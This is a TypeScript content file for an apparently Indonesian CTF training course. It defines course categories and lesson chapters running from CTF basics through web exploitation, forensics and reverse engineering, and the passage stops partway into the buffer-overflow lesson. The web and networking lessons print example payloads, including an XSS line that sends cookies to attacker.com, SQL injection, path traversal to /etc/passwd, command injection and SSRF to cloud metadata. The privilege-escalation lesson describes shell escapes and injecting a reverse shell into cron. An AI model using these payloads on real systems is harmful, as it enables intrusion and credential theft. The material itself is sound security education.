import { CategoryInfo, ModuleChapter } from '../types';

export const CATEGORIES: CategoryInfo[] = [
  {
    id: 'pengantar',
    name: 'Pengantar CTF',
    shortName: 'Intro',
    tag: 'FUNDAMENTAL',
    icon: 'Flag',
    description: 'Konsep dasar Capture The Flag, format Jeopardy vs Attack-Defense, anatomi challenge, dan etika hacker.',
    difficultyTier: 'basic',
    color: '#FF5A1F',
    chapterNumber: 1
  },
  {
    id: 'environment',
    name: 'Persiapan Environment',
    shortName: 'Setup',
    tag: 'TOOLING & LAB',
    icon: 'Terminal',
    description: 'Instalasi Kali Linux, WSL2, Docker, dan kumpulan tools esensial cybersecurity (Burp, Ghidra, Wireshark).',
    difficultyTier: 'basic',
    color: '#3B82F6',
    chapterNumber: 2
  },
  {
    id: 'linux',
    name: 'Dasar Linux & CLI',
    shortName: 'Linux',
    tag: 'OPERATING SYSTEM',
    icon: 'Terminal',
    description: 'Navigasi terminal, file permissions (SUID), inspeksi binary, text processing (grep, awk, sed), dan privilege escalation.',
    difficultyTier: 'basic',
    color: '#4ADE80',
    chapterNumber: 3
  },
  {
    id: 'networking',
    name: 'Jaringan Komputer',
    shortName: 'Network',
    tag: 'PROTOCOLS & PCAP',
    icon: 'Wifi',
    description: 'TCP/IP 3-way handshake, OSI Layer, port scanning nmap, netcat listener, DNS tunneling, dan analisis paket Wireshark.',
    difficultyTier: 'basic',
    color: '#38BDF8',
    chapterNumber: 4
  },
  {
    id: 'crypto',
    name: 'Cryptography',
    shortName: 'Crypto',
    tag: 'CIPHERS & KEYS',
    icon: 'Lock',
    description: 'Encoding (Base64, Hex), Classic Ciphers (Caesar, Vigenère, XOR), AES CBC bit-flipping, dan eksploitasi RSA small exponent.',
    difficultyTier: 'menengah',
    color: '#A855F7',
    chapterNumber: 5
  },
  {
    id: 'web',
    name: 'Web Exploitation',
    shortName: 'Web',
    tag: 'OWASP TOP 10',
    icon: 'Globe',
    description: 'SQL Injection, XSS, Path Traversal (LFI), Command Injection, SSRF, dan kelemahan autentikasi JWT token forgery.',
    difficultyTier: 'menengah',
    color: '#F43F5E',
    chapterNumber: 6
  },
  {
    id: 'forensics',
    name: 'Digital Forensics',
    shortName: 'Forensics',
    tag: 'ARTIFACTS & MEMORY',
    icon: 'Search',
    description: 'Magic bytes header repair, metadata carving (exiftool), file extraction binwalk, dan memory analysis Volatility.',
    difficultyTier: 'menengah',
    color: '#F59E0B',
    chapterNumber: 7
  },
  {
    id: 'stego',
    name: 'Steganography',
    shortName: 'Stego',
    tag: 'HIDDEN PAYLOADS',
    icon: 'EyeOff',
    description: 'Teknik LSB image encoding, zsteg, steghide brute-force, zero-width stego, dan visualisasi audio spectrogram.',
    difficultyTier: 'basic',
    color: '#EC4899',
    chapterNumber: 8
  },
  {
    id: 'reverse',
    name: 'Reverse Engineering',
    shortName: 'Reverse',
    tag: 'DECOMPILATION',
    icon: 'Cpu',
    description: 'Arsitektur register x86/x64, decompilation Ghidra/IDA, binary patching, deobfuscation, dan dynamic debugging dengan GDB.',
    difficultyTier: 'advance',
    color: '#06B6D4',
    chapterNumber: 9
  },
  {
    id: 'pwn',
    name: 'Binary Exploitation',
    shortName: 'Pwn',
    tag: 'MEMORY CORRUPTION',
    icon: 'Flame',
    description: 'Memory layout Linux, Buffer Overflow klasik, Saved Return Address hijacking, Format String bugs, dan automasi Pwntools.',
    difficultyTier: 'advance',
    color: '#EF4444',
    chapterNumber: 10
  },
  {
    id: 'osint',
    name: 'OSINT',
    shortName: 'OSINT',
    tag: 'RECONNAISSANCE',
    icon: 'Compass',
    description: 'Advanced Google Dorking, DNS/WHOIS footprinting, geolokasi citra satelit/EXIF, dan historical recon via Wayback Machine.',
    difficultyTier: 'basic',
    color: '#10B981',
    chapterNumber: 11
  },
  {
    id: 'scripting',
    name: 'Scripting & Automasi',
    shortName: 'Scripting',
    tag: 'PYTHON HACKING',
    icon: 'Code',
    description: 'Automasi solver CTF dengan Python, socket programming, brute-force requests, concurrency, dan regex extraction.',
    difficultyTier: 'menengah',
    color: '#8B5CF6',
    chapterNumber: 12
  },
  {
    id: 'strategi',
    name: 'Strategi Lomba CTF',
    shortName: 'Strategy',
    tag: 'COMPETITION',
    icon: 'Trophy',
    description: 'Manajemen tim, triage soal bernilai tinggi, time-boxing 30 menit, dokumentasi write-up, dan menjaga ketahanan mental.',
    difficultyTier: 'basic',
    color: '#F97316',
    chapterNumber: 13
  },
  {
    id: 'resources',
    name: 'Roadmap & Sumber Belajar',
    shortName: 'Resources',
    tag: 'CAREER & WARGAMES',
    icon: 'BookOpen',
    description: 'Platform latihan internasional (HackTheBox, TryHackMe, PortSwigger), sertifikasi industri (OSCP, CEH), dan jenjang karier.',
    difficultyTier: 'basic',
    color: '#6366F1',
    chapterNumber: 14
  }
];

export const MODULE_CHAPTERS: ModuleChapter[] = [
  // ==========================================
  // BAB 1: PENGANTAR CTF
  // ==========================================
  {
    id: 'pengantar',
    chapterNumber: 1,
    title: 'Pengantar Capture The Flag (CTF)',
    summary: 'Fondasi esensial kompetisi keamanan siber: dari model kompetisi Jeopardy vs Attack-Defense hingga etika peretasan legal.',
    readingTimeMinutes: 8,
    practiceChallengeIds: ['lin_01'],
    sections: [
      {
        id: '1.1',
        title: '1.1 Apa Itu Capture The Flag (CTF)?',
        content: `**Capture The Flag (CTF)** adalah kompetisi keamanan informasi di mana peserta memecahkan teka-teki teknis di berbagai bidang cybersecurity untuk menemukan string teks rahasia yang disebut **"Flag"**.

Format umum Flag:
\`\`\`text
flag{this_is_an_example_flag_1337}
CTF{b4se64_d3c0d3d_succ3ss}
FLAGFORGE{w3lc0m3_t0_ctf_2026}
\`\`\`

Ketika Anda menemukan flag, Anda memasukkannya ke platform scoring untuk mendapatkan poin.`
      },
      {
        id: '1.2',
        title: '1.2 Format Pertandingan CTF',
        content: `### 1. Jeopardy-Style (Paling Populer untuk Pemula)
- Peserta disajikan daftar tantangan yang dibagi berdasarkan kategori (Web, Crypto, Forensics, Reverse, Pwn, OSINT).
- Setiap tantangan memiliki bobot poin tertentu (misal: 100, 200, 500 poin) berdasarkan tingkat kesulitan.
- Poin berkurang secara dinamis (*dynamic scoring*) jika semakin banyak tim yang berhasil menyelesaikan soal tersebut.

### 2. Attack-Defense (Simulasi Perang Siber Nyata)
- Setiap tim diberikan satu server virtual (Vulnerable Image) dengan layanan/service yang sama.
- **Tugas Ganda**:
  - **Defend**: Memperbaiki (*patch*) celah keamanan di server sendiri agar flag tidak dicuri.
  - **Attack**: Menyerang server tim lawan menggunakan exploit untuk mencuri flag mereka.`
      },
      {
        id: '1.3',
        title: '1.3 Etika Hacker & Legalitas (Rules of Engagement)',
        content: `Keamanan siber adalah keahlian berdaya rusak tinggi. Di dunia nyata dan kompetisi CTF, Anda wajib mematuhi aturan etika:
1. **No DoS/DDoS**: Dilarang membanjiri infrastruktur panitia dengan traffic berlebih.
2. **Jangan Menyerang Peserta Lain**: Kecuali pada format Attack-Defense yang resmi mengizinkannya.
3. **No Flag Sharing**: Dilarang membagikan flag secara langsung kepada tim lain selama lomba berlangsung.
4. **Prinsip Legalitas**: Jangan pernah menguji teknik penetrasi yang Anda pelajari di server publik tanpa izin tertulis (*Written Authorization*).`
      }
    ]
  },

  // ==========================================
  // BAB 2: PERSIAPAN ENVIRONMENT & TOOLING
  // ==========================================
  {
    id: 'environment',
    chapterNumber: 2,
    title: 'Persiapan Environment & Tooling',
    summary: 'Membangun workstation peretas yang tangguh menggunakan Kali Linux, WSL2, Docker, dan kumpulan perkakas analisis biner & web.',
    readingTimeMinutes: 12,
    practiceChallengeIds: ['lin_01'],
    sections: [
      {
        id: '2.1',
        title: '2.1 Memilih Sistem Operasi: Kali Linux vs WSL2',
        content: `Hampir seluruh tool keamanan siber dibangun natively untuk platform Linux. Ada 3 metode utama setup environment:

- **WSL2 (Windows Subsystem for Linux)**: Pilihan terbaik untuk pengguna Windows tanpa perlu dual-boot. Ringan dan terintegrasi langsung dengan VS Code.
- **Kali Linux VM (VirtualBox / VMware)**: Distribusi Linux terlengkap dengan ratusan tool pre-installed.
- **Docker Containers**: Ideal untuk menjalankan target lokal atau isolasi dependensi python/libc versi lama.`
      },
      {
        id: '2.2',
        title: '2.2 Kumpulan Tool Wajib Per Kategori',
        content: `| Kategori | Tool Wajib | Fungsi Utama |
|---|---|---|
| **Web** | Burp Suite Community, Caido, sqlmap, ffuf, curl | Intercept proxy, directory fuzzing, SQLi |
| **Cryptography** | CyberChef, Python (pycryptodome), RsaCtfTool, FeatherDuster | Decoding, RSA attacks, frequency analysis |
| **Forensics** | Wireshark, tshark, binwalk, ExifTool, Volatility 3 | Packet inspection, carving, memory dump |
| **Reverse** | Ghidra (NSA), IDA Free, GDB + GEF/pwndbg, strings | Decompiler, disassembler, debugger |
| **Pwn** | Pwntools (Python library), checksec, ROPgadget, one_gadget | Exploit automation, ROP chain generator |
| **Steganography** | zsteg, steghide, Sonic Visualiser, AperiSolve | LSB extraction, audio spectrogram |`
      }
    ]
  },

  // ==========================================
  // BAB 3: DASAR LINUX & COMMAND LINE
  // ==========================================
  {
    id: 'linux',
    chapterNumber: 3,
    title: 'Dasar Linux & Command Line Mastery',
    summary: 'Kelihaian navigasi terminal, manipulasi permission (SUID/SGID), filter teks dengan grep/awk/sed, hingga eksploitasi Privilege Escalation.',
    readingTimeMinutes: 18,
    practiceChallengeIds: ['lin_01', 'lin_02', 'lin_03', 'lin_04'],
    sections: [
      {
        id: '3.1',
        title: '3.1 Navigasi File & File System Hierarchy',
        content: `Struktur direktori Linux penting dipahami untuk mencari artifact:
- \`/etc\` : Konfigurasi sistem (misal: \`/etc/passwd\`, \`/etc/shadow\`, \`/etc/crontab\`).
- \`/var/log\` : Catatan log server (Apache, Nginx, auth.log, syslog).
- \`/tmp\` & \`/dev/shm\` : Direktori sementara dengan permission world-writable (tempat menyimpan payload).
- \`/opt\` : Aplikasi pihak ketiga dan script kustom.

\`\`\`bash
# Navigasi cepat
pwd                  # Print working directory
ls -la               # List semua file termasuk hidden dotfiles
cd ~/.secret         # Pindah ke direktori tersembunyi di home
find / -name "*flag*" 2>/dev/null  # Cari file flag di seluruh sistem
\`\`\``
      },
      {
        id: '3.2',
        title: '3.2 Text Processing Pipelines (grep, cut, sort, uniq, wc)',
        content: `Kemampuan menghubungkan command via pipe (\`|\`) adalah kekuatan utama terminal Linux:

\`\`\`bash
# 1. Cari baris yang mengandung "flag{" di access log
grep "flag{" /var/log/access.log

# 2. Case-insensitive search dengan nomor baris
grep -in "password" /etc/config.txt

# 3. Hitung jumlah request per IP address
cat access.log | cut -d' ' -f1 | sort | uniq -c | sort -nr | head -n 10

# 4. Filter string biner yang dapat dibaca manusia
strings mystery_binary | grep -E "^[A-Za-z0-9+/=]{20,}$"
\`\`\``
      },
      {
        id: '3.3',
        title: '3.3 File Permissions & SUID Bits',
        content: `Format permission Linux: \`-rwxrwxrwx\` (User, Group, Others).

### SUID (Set User ID) Bit:
Ketika SUID bit (\`s\`) aktif pada sebuah binary executable, program tersebut akan dieksekusi dengan **hak akses milik pemilik file (biasanya root)**, bukan user yang menjalankannya.

\`\`\`bash
# Mencari semua binary dengan SUID bit aktif
find / -perm -4000 -type f 2>/dev/null
\`\`\`

Jika binary seperti \`find\`, \`base64\`, \`vim\`, atau \`bash\` memiliki SUID bit, Anda dapat memanfaatkannya untuk membaca file sensitif root atau mendapatkan root shell (buka referensi di **GTFOBins**).`
      },
      {
        id: '3.4',
        title: '3.4 Linux Privilege Escalation (PrivEsc)',
        content: `Privilege Escalation adalah seni meningkatkan hak akses dari user biasa (\`cadet\`) menjadi \`root\`.

### Vektor PrivEsc Paling Umum di CTF:
1. **Sudo Misconfiguration (\`sudo -l\`)**:
   Melihat perintah apa saja yang diizinkan dijalankan sebagai root tanpa password:
   \`\`\`bash
   cadet@box:~$ sudo -l
   # Matching Defaults entries for cadet: env_reset
   # User cadet may run the following commands on box:
   #     (ALL : ALL) NOPASSWD: /usr/bin/less /var/log/*
   # Exploit: Jalankan sudo less /var/log/syslog, lalu ketik !/bin/sh
   \`\`\`

2. **Cron Jobs yang Rentan**:
   Mengecek tugas otomatis yang dijalankan secara berkala oleh root:
   \`\`\`bash
   cat /etc/crontab
   cat /etc/cron.d/*
   \`\`\`
   Jika script yang dipanggil oleh cron memiliki permission *world-writable* (\`chmod 777\`), Anda dapat menginjeksi perintah reverse shell ke dalamnya.

3. **Writable \`/etc/passwd\`**:
   Jika file \`/etc/passwd\` dapat diedit, Anda dapat membuat user root baru dengan password yang Anda ketahui.`
      }
    ]
  },

  // ==========================================
  // BAB 4: JARINGAN KOMPUTER & ANALISIS PAKET
  // ==========================================
  {
    id: 'networking',
    chapterNumber: 4,
    title: 'Jaringan Komputer & Analisis Paket',
    summary: 'Protokol TCP/IP, 3-way handshake, port scanning nmap, netcat stream, DNS exfiltration, dan pembacaan stream PCAP di Wireshark.',
    readingTimeMinutes: 16,
    practiceChallengeIds: ['net_01', 'net_02', 'net_03'],
    sections: [
      {
        id: '4.1',
        title: '4.1 Model TCP/IP & Wireshark Stream Reconstruction',
        content: `Dalam challenge Forensics/Network, Anda sering diberikan file capture \`.pcap\` atau \`.pcapng\`.

### Langkah Analisis Wireshark:
1. **Statistik Protokol**: Buka menu *Statistics > Protocol Hierarchy* untuk melihat distribusi protokol (HTTP, DNS, TCP, TLS).
2. **Follow TCP Stream**: Klik kanan pada paket TCP > *Follow > TCP Stream* untuk membaca seluruh percakapan plaintext antara klien dan server.
3. **Filter Populer Wireshark**:
   \`\`\`text
   http.request.method == "POST"     # Cari pengiriman formulir login
   frame contains "flag{"            # Cari paket yang memuat kata kunci flag
   tcp.port == 1337                  # Filter port tertentu
   dns.qry.name contains "exfil"     # Filter query DNS mencurigakan
   \`\`\``
      },
      {
        id: '4.2',
        title: '4.2 Port Scanning & Netcat Listener',
        content: `\`\`\`bash
# Nmap: Deteksi port terbuka dan service version
nmap -sV -sC -p- 10.10.10.100

# Netcat: Interaksi raw socket dengan target challenge
nc target.flagforge.io 1337

# Netcat: Membuat listener lokal untuk menangkap reverse shell
nc -lvnp 4444
\`\`\``
      },
      {
        id: '4.3',
        title: '4.3 DNS Tunneling & Data Exfiltration',
        content: `DNS adalah salah satu protokol yang hampir selalu diizinkan melewati firewall outbound. Penyerang sering menyalahgunakannya untuk mengekstrak data (*DNS Exfiltration*).

### Mekanisme DNS Exfiltration:
1. Data rahasia di-encode ke format Hex atau Base32/Base64: \`flag{hello}\` → \`666c61677b68656c6c6f7d\`
2. Data dipecah menjadi subdomain query: \`666c6167.exfil.attacker.com\`
3. Server DNS otoritatif penyerang menangkap semua log query dan menggabungkan kembali string hex tersebut.

### Cara Memecahkan Soal DNS Tunnel:
Ekstrak semua subdomain dari log DNS, gabungkan urutannya, lalu decode dari Hex ke ASCII.`
      }
    ]
  },

  // ==========================================
  // BAB 5: KRIPTOGRAFI (CRYPTOGRAPHY)
  // ==========================================
  {
    id: 'crypto',
    chapterNumber: 5,
    title: 'Kriptografi: Encoding, Ciphers & Asymmetric Keys',
    summary: 'Perbedaan Encoding vs Enkripsi, Caesar, Vigenère, XOR KPA, AES CBC Bit-Flipping, hingga serangan RSA Small Exponent.',
    readingTimeMinutes: 20,
    practiceChallengeIds: ['cry_01', 'cry_02', 'cry_03', 'cry_04', 'cry_05'],
    sections: [
      {
        id: '5.1',
        title: '5.1 Encoding vs Enkripsi vs Hashing',
        content: `Banyak pemula salah mengira Encoding sebagai Enkripsi:
- **Encoding (Base64, Hex, URL, ASCII85)**: Pengubahan format representasi data tanpa kunci rahasia. Siapa saja dapat mendekodenya.
  - Ciri Base64: Karakter \`[A-Za-z0-9+/]\` dengan padding \`=\` di akhir.
  - Ciri Hex: Karakter \`[0-9a-fA-F]\` berpasangan 2 digit per byte.
- **Enkripsi (AES, RSA, ChaCha20)**: Pengacakan data yang memerlukan **Kunci Rahasia** untuk membaca kembali plaintext.
- **Hashing (MD5, SHA-256, bcrypt)**: Fungsi satu arah (*one-way mathematical function*) tanpa kemampuan dekripsi.`
      },
      {
        id: '5.2',
        title: '5.2 Classic Ciphers: Caesar, ROT13 & Vigenère',
        content: `### 1. Caesar Cipher (Monoalphabetic Substitution)
Setiap huruf digeser sebanyak $k$ langkah di alfabet ($C = (P + k) \\pmod{26}$).
- **ROT13**: Pergeseran khusus 13 langkah. Karena alfabet berjumlah 26, mengenkripsi dua kali mengembalikan pesan asli!

### 2. Vigenère Cipher (Polyalphabetic Substitution)
Menggunakan kata kunci (*key*) berulang untuk menentukan pergeseran tiap huruf:
$$C_i = (P_i + K_{i \\pmod{|K|}}) \\pmod{26}$$

Penyelesaian: Jika panjang kunci diketahui, gunakan **Kasiski Examination** dan analisis frekuensi huruf (*Frequency Analysis*) untuk merekonstruksi kunci.`
      },
      {
        id: '5.3',
        title: '5.3 Exclusive OR (XOR) & Known-Plaintext Attack',
        content: `Operasi XOR ($\oplus$) adalah pilar utama kriptografi modern karena sifat matematikanya:
$$A \oplus B = C \iff C \oplus B = A \iff C \oplus A = B$$

### Known-Plaintext Attack (KPA) pada Repeating-Key XOR:
Jika Anda mengetahui awalan plaintext (misal format flag \`flag{\`), Anda dapat menemukan awalan kunci dengan:
$$\\text{Key}[0..4] = \\text{Ciphertext}[0..4] \oplus \\text{"flag{"}$$

Setelah panjang kunci ditemukan, gunakan kunci berulang tersebut untuk mendekripsi seluruh ciphertext.`
      },
      {
        id: '5.4',
        title: '5.4 RSA Asymmetric Cryptography & Small Exponent Attack',
        content: `RSA bergantung pada perkalian dua bilangan prima besar $n = p \times q$.
- Public Key: $(e, n)$ di mana $e$ adalah public exponent (umumnya 65537 atau 3).
- Private Key: $d = e^{-1} \pmod{\phi(n)}$ di mana $\phi(n) = (p-1)(q-1)$.
- Enkripsi: $c = m^e \pmod{n}$
- Dekripsi: $m = c^d \pmod{n}$

### Serangan RSA Populer di CTF:
1. **Small Public Exponent ($e = 3$) Tanpa Padding**:
   Jika pesan $m$ kecil sehingga $m^3 < n$, maka operasi modulus tidak terjadi ($c = m^3$). Dekripsi cukup dengan menghitung **akar pangkat tiga biasa** dari $c$:
   $$m = \lfloor \sqrt[3]{c} \rfloor$$
2. **Wiener's Attack**: Digunakan saat private exponent $d$ terlalu kecil ($d < \frac{1}{3} n^{1/4}$).
3. **Faktorisasi $n$ Kecil (factordb.com)**: Jika modulus $n$ dapat difaktorkan menjadi $p$ dan $q$, hitung $\phi(n)$ lalu dapatkan private key $d$.`
      }
    ]
  },

  // ==========================================
  // BAB 6: WEB EXPLOITATION (OWASP TOP 10)
  // ==========================================
  {
    id: 'web',
    chapterNumber: 6,
    title: 'Web Exploitation: Dari SQLi hingga JWT Forgery',
    summary: 'Eksploitasi celah web: SQL Injection auth bypass, Cross-Site Scripting (XSS), Local File Inclusion (LFI), Command Injection, SSRF, dan JWT token forgery.',
    readingTimeMinutes: 22,
    practiceChallengeIds: ['web_01', 'web_02', 'web_03', 'web_04', 'web_05', 'web_06', 'web_07'],
    sections: [
      {
        id: '6.1',
        title: '6.1 SQL Injection (SQLi) & Authentication Bypass',
        content: `SQL Injection terjadi saat input pengguna digabungkan langsung ke string query SQL tanpa sanitasi atau parameter binding:

\`\`\`sql
-- Query Rentan di Backend
SELECT * FROM users WHERE username = '$user_input' AND password = '$password_input';
\`\`\`

### Payload Auth Bypass Klasik:
Kirim input username: \`admin' OR '1'='1' --\`
Hasil evaluasi query:
\`\`\`sql
SELECT * FROM users WHERE username = 'admin' OR '1'='1' --' AND password = '...';
\`\`\`
Bagian \`--\` mengabaikan pengecekan password dan mengembalikan baris pertama tabel user (admin).`
      },
      {
        id: '6.2',
        title: '6.2 Local File Inclusion (LFI) & Directory Traversal',
        content: `Terjadi ketika aplikasi memuat file lokal berdasarkan parameter URL tanpa validasi:

\`\`\`php
// Kode PHP Rentan
include("pages/" . $_GET['page']);
\`\`\`

### Eksploitasi Directory Traversal:
Gunakan urutan \`../\` untuk keluar dari folder webroot:
\`\`\`text
GET /index.php?page=../../../../etc/passwd
GET /index.php?page=../../../../flag.txt
\`\`\`

### PHP Wrappers:
Jika kode menambahkan ekstensi \`.php\` otomatis (\`include($_GET['p'] . ".php")\`), gunakan base64 filter wrapper untuk membaca source code:
\`\`\`text
GET /index.php?page=php://filter/convert.base64-encode/resource=secret
\`\`\``
      },
      {
        id: '6.3',
        title: '6.3 Cross-Site Scripting (XSS) & Cookie Theft',
        content: `Cross-Site Scripting (XSS) memungkinkan penyerang mengeksekusi JavaScript berbahaya di browser korban.

### Jenis XSS:
- **Reflected XSS**: Payload disisipkan via parameter URL dan langsung dipantulkan ke response HTML.
- **Stored XSS**: Payload disimpan di database (misal komentar artikel) dan dieksekusi setiap kali korban membuka halaman.
- **DOM-based XSS**: Kerentanan manipulasi DOM langsung di sisi klien JavaScript.

### Payload Pengambilan Cookie:
\`\`\`html
<script>
  new Image().src = "http://attacker.com/log?cookie=" + encodeURIComponent(document.cookie);
</script>
\`\`\``
      },
      {
        id: '6.4',
        title: '6.4 Command Injection & Filter Bypassing',
        content: `Command Injection terjadi saat aplikasi memanggil fungsi shell sistem (seperti \`system()\`, \`exec()\`, \`subprocess.Popen\`) dengan input user yang tidak disanitasi:

\`\`\`python
# Kode Python Rentan
os.system(f"ping -c 1 {user_ip}")
\`\`\`

### Operator Penyambung Perintah:
- \`;\` (Semicolon) : Jalankan perintah berikutnya secara berurutan.
- \`|\` (Pipe) : Alirkan output perintah ke perintah berikutnya.
- \`&&\` (AND) : Jalankan perintah kedua jika perintah pertama sukses.
- \`||\` (OR) : Jalankan perintah kedua jika perintah pertama gagal.

### Contoh Payload:
\`\`\`text
127.0.0.1; cat /etc/passwd
127.0.0.1 && cat /flag.txt
\`\`\``
      },
      {
        id: '6.5',
        title: '6.5 Server-Side Request Forgery (SSRF) & JWT Forgery',
        content: `### 1. Server-Side Request Forgery (SSRF)
Memaksa server korban membuat request HTTP ke resource internal yang tidak dapat diakses dari internet publik:
\`\`\`text
POST /fetch-url
{"url": "http://127.0.0.1:8080/admin/secret_flag"}
{"url": "http://169.254.169.254/latest/meta-data/"} # AWS Metadata Cloud Token
\`\`\`

### 2. JSON Web Token (JWT) Exploitation:
Struktur JWT: \`header.payload.signature\` (semuanya di-encode Base64Url).
- **None Algorithm Attack**: Ubah \`"alg": "HS256"\` pada header menjadi \`"alg": "none"\`, ubah isi payload menjadi \`"user": "admin"\`, lalu hapus bagian signature (\`header.payload.\`).`
      }
    ]
  },

  // ==========================================
  // BAB 7: DIGITAL FORENSIK (DIGITAL FORENSICS)
  // ==========================================
  {
    id: 'forensics',
    chapterNumber: 7,
    title: 'Digital Forensics & Memory Analysis',
    summary: 'Magic bytes header carving, metadata EXIF, ekstraksi embedded archives dengan binwalk, dan analisis RAM memory dump dengan Volatility 3.',
    readingTimeMinutes: 16,
    practiceChallengeIds: ['for_01', 'for_02', 'for_03', 'for_04'],
    sections: [
      {
        id: '7.1',
        title: '7.1 Magic Bytes Header & File Signatures',
        content: `Sistem operasi tidak hanya mengandalkan ekstensi file (\`.png\`, \`.jpg\`, \`.zip\`), melainkan membaca **Magic Bytes** (byte penanda di awal file):

| Tipe File | Magic Bytes (Hex) | ASCII Equivalent |
|---|---|---|
| **PNG** | \`89 50 4E 47 0D 0A 1A 0A\` | \`.PNG....\` |
| **JPEG / JPG** | \`FF D8 FF E0\` atau \`FF D8 FF E1\` | \`....\` (JFIF/Exif) |
| **GIF** | \`47 49 46 38 37 61\` / \`39 61\` | \`GIF87a\` / \`GIF89a\` |
| **ZIP / DOCX** | \`50 4B 03 04\` | \`PK..\` |
| **PDF** | \`25 50 44 46\` | \`%PDF\` |
| **ELF (Linux Binary)** | \`7F 45 4C 46\` | \`.ELF\` |

Jika gambar tidak dapat dibuka, buka di hex editor (\`xxd\` / \`010 Editor\`) dan perbaiki 8 byte pertamanya!`
      },
      {
        id: '7.2',
        title: '7.2 File Carving dengan Binwalk',
        content: `Binwalk memindai file untuk mencari signature arsip atau gambar lain yang disematkan di dalamnya (*nested file*):

\`\`\`bash
# Pindai file untuk melihat struktur konten di dalamnya
binwalk evidence.png

# Ekstrak semua file tersembunyi secara otomatis
binwalk -e --run-as=root evidence.png
\`\`\``
      },
      {
        id: '7.3',
        title: '7.3 Memory Forensics dengan Volatility 3',
        content: `Analisis raw memory dump (\`.raw\`, \`.vmem\`, \`.dmp\`) dari RAM komputer:

\`\`\`bash
# 1. Daftar proses yang sedang berjalan saat dump diambil
vol -f memdump.raw windows.pslist

# 2. Periksa argumen baris perintah yang dieksekusi
vol -f memdump.raw windows.cmdline

# 3. Pindai file yang ada di memori dan ekstrak
vol -f memdump.raw windows.filescan | grep -i "flag"
vol -f memdump.raw windows.dumpfiles --virtaddr 0xdeadbeef
\`\`\``
      }
    ]
  },

  // ==========================================
  // BAB 8: STEGANOGRAFI (STEGANOGRAPHY)
  // ==========================================
  {
    id: 'stego',
    chapterNumber: 8,
    title: 'Steganography: Seni Menyembunyikan Pesan Rahasia',
    summary: 'Metode Least Significant Bit (LSB), steghide password cracking, steganografi teks zero-width, dan analisis spectrogram audio.',
    readingTimeMinutes: 14,
    practiceChallengeIds: ['stg_01', 'stg_02'],
    sections: [
      {
        id: '8.1',
        title: '8.1 Least Significant Bit (LSB) Steganography',
        content: `Gambar digital tersusun atas kanal warna RGB (Red, Green, Blue) bernilai 0–255 (8-bit binary).

LSB memanfaatkan **bit terakhir (bit ke-0)** pada tiap byte warna. Mengubah bit terakhir (misal dari \`11111110\` ke \`11111111\`) hanya mengubah intensitas warna sebesar $1/256$, yang sama sekali tidak dapat dideteksi oleh mata manusia!

\`\`\`bash
# Tool otomatis paling handal untuk deteksi LSB PNG/BMP
zsteg -a image.png
\`\`\``
      },
      {
        id: '8.2',
        title: '8.2 Audio Spectrogram Steganography',
        content: `Pesan teks atau gambar dapat dikonversi menjadi frekuensi suara tertentu. Saat didengarkan, file audio (\`.wav\` / \`.mp3\`) hanya terdengar seperti derau nada tinggi (*high pitch tone*).

### Cara Membaca Audio Spectrogram:
1. Buka file di software **Sonic Visualiser** atau **Audacity**.
2. Tambahkan layer visualisasi: *Layer > Add Spectrogram*.
3. Atur skala frekuensi menjadi Logarithmic / High Frequency (>15 kHz) untuk melihat gambar teks flag yang tersembunyi.`
      }
    ]
  },

  // ==========================================
  // BAB 9: REVERSE ENGINEERING
  // ==========================================
  {
    id: 'reverse',
    chapterNumber: 9,
    title: 'Reverse Engineering: Membedah Logika Biner',
    summary: 'Register CPU x86_64, teknik decompilation Ghidra/IDA Pro, string extraction, deobfuscation, dan dynamic debugging dengan GDB.',
    readingTimeMinutes: 20,
    practiceChallengeIds: ['rev_01', 'rev_02'],
    sections: [
      {
        id: '9.1',
        title: '9.1 Arsitektur x86_64 & Register CPU',
        content: `Register CPU adalah memori super cepat di dalam prosesor:
- **RAX / EAX**: Accumulator, tempat menampung *return value* fungsi.
- **RDI, RSI, RDX, RCX, R8, R9**: Register penampung argumen fungsi ke-1 hingga ke-6 pada arsitektur Linux x86_64 (*System V AMD64 ABI*).
- **RSP**: Stack Pointer (menunjuk ke puncak stack saat ini).
- **RBP**: Base/Frame Pointer (menunjuk ke dasar stack frame lokal).
- **RIP / EIP**: Instruction Pointer (menunjuk ke alamat memori instruksi mesin berikutnya yang akan dieksekusi!).`
      },
      {
        id: '9.2',
        title: '9.2 Alur Static Analysis dengan Ghidra',
        content: `1. Buka file biner di **Ghidra**, jalankan *Auto Analysis*.
2. Buka jendela *Symbol Tree > Functions > main*.
3. Periksa jendela **Decompiler** di sebelah kanan yang mengubah assembly menjadi pseudocode C yang mudah dibaca.
4. Identifikasi fungsi perbandingan kunci seperti \`strncmp(input, secret, len)\` atau algoritma hashing/XOR yang memvalidasi serial number.`
      },
      {
        id: '9.3',
        title: '9.3 Dynamic Analysis & Debugging dengan GDB',
        content: `\`\`\`bash
# Jalankan GDB dengan ekstensi pwndbg/GEF
gdb ./target_binary

# Pasang breakpoint pada fungsi main atau titik perbandingan
(gdb) b main
(gdb) b *0x004011f6

# Jalankan program dan periksa register
(gdb) r
(gdb) info registers
(gdb) x/s $rdi         # Baca string pada register RDI
(gdb) set $rax = 1     # Patch return value untuk mem-bypass perbandingan!
\`\`\``
      }
    ]
  },

  // ==========================================
  // BAB 10: BINARY EXPLOITATION (PWN)
  // ==========================================
  {
    id: 'pwn',
    chapterNumber: 10,
    title: 'Binary Exploitation (Pwn): Memory Corruption',
    summary: 'Struktur memori Stack Frame, Buffer Overflow klasik, Saved Return Address hijacking, Format String bugs, dan automasi exploit dengan Pwntools.',
    readingTimeMinutes: 24,
    practiceChallengeIds: ['pwn_01', 'pwn_02'],
    sections: [
      {
        id: '10.1',
        title: '10.1 Peta Memori Proses Linux & Stack Frame',
        content: `\`\`\`text
[ Alamat Memori Rendah : 0x000000000000 ]
  ├── .text    (Kode mesin biner yang dapat dieksekusi)
  ├── .data    (Variabel global yang diinisialisasi)
  ├── .bss     (Variabel global yang belum diinisialisasi)
  ├── HEAP     (Alokasi dinamis via malloc() ──> Tumbuh ke atas)
  │   ...
  ├── STACK    (Variabel lokal fungsi, SFP, RET ──> Tumbuh ke BAWAH)
[ Alamat Memori Tinggi : 0x7fffffffffff ]
\`\`\`

### Struktur Stack Frame:
\`\`\`text
[ Buffer Lokal (misal 64 bytes) ]  <── Mulai pengisian input
[ Saved Frame Pointer (SFP / RBP) (8 bytes) ]
[ Saved Return Address (RET / RIP) (8 bytes) ]  <── TARGET OVERWRITE
\`\`\``
      },
      {
        id: '10.2',
        title: '10.2 Mekanisme Serangan Buffer Overflow Klasik',
        content: `Fungsi seperti \`gets()\`, \`strcpy()\`, dan \`scanf("%s")\` tidak memeriksa batas panjang input buffer:

